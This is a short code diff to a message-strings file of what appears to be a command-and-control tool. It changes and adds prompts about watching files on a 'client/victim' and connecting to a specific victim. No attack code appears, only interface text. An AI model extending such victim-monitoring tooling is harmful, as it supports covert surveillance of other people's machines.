@@ -171,8 +171,12 @@ NOT_WATCHING_FILE_ERROR = "[+] STOP WATCH FILE ERROR: You are not currently watc
 # MENU ITEM 11 - Stop Watching File
 STOP_WATCH_FILE_MSG = "[+] [MENU ITEM 11] - Now Stopping Watch File"
 STOP_WATCH_FILE_NO_CLIENTS_ERROR = "[+] STOP_WATCH_FILE_ERROR: The command server is not connected to any clients!"
-STOP_WATCH_FILE_TIP = ("[+] TIP: You can wait for an file event trigger from ({}, {}) to "
-                       "trigger STOP or press CTRL + C to go back to main menu")
+STOP_WATCH_FILE_TIP = ("[+] TIP: You can wait for client/victim ({}, {}) to "
+                       "process STOP or press CTRL + C to go back to main menu")
+STOP_WATCH_THREAD_CONCURRENCY_WARNING = ("[+] WARNING: You are not allowed to perform any actions on client/victim "
+                                         "({}, {}) until they have performed one final event on the file that was "
+                                         "currently being watched (i.e. Wait until Watch_File_Client_Socket thread "
+                                         "has finished...)")
 
 # MENU ITEM 12 - Connect to a specific victim
 INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"
